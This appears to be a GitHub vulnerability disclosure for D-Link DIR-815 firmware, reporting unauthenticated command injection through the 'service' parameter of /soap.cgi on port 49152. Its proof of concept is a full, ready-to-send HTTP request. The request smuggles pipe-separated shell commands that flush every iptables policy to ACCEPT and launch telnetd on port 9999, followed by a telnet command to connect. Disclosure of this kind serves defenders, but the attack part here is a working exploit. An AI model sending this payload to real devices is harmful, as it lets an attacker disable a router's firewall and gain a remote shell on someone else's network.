# dir-815
Exploit Author: yangchunyu@whu.edu.cn
Vendor: D-Link

Firmware: dir815_v1.01SSb08.bin

I found unauthenticated remote code execution vulnerability in soapcgi_main function of cgibin binary.

On the /soap.cgi HTTP POST message on 49152 port, with the service GET parameter, the unauthenticated remote attacker can execute the shell command.

The similar vulnerability already exists with CVE-2018-6530&CVE-2018-20114.

![image](https://github.com/WhereisRain/dir-815/blob/main/somecode.jpg)

With | string, the device can be exploited, too.

# poc
nc 192.168.0.1 49152
<br>POST /soap.cgi?service=|iptables -P INPUT ACCEPT|iptables -P FORWARD ACCEPT|iptables -P OUTPUT ACCEPT|iptables -t nat -P PREROUTING ACCEPT|iptables -t nat -P OUTPUT ACCEPT|iptables -t nat -P POSTROUTING ACCEPT|telnetd -p 9999| HTTP/1.1
<br>Host: 192.168.0.1:49152
<br>Accept-Encoding: identity
<br>Content-Length: 16
<br>SOAPAction: "whatever-serviceType#whatever-action"
<br>Content-Type: text/xml

whatever content...

telnet 192.168.0.1 9999
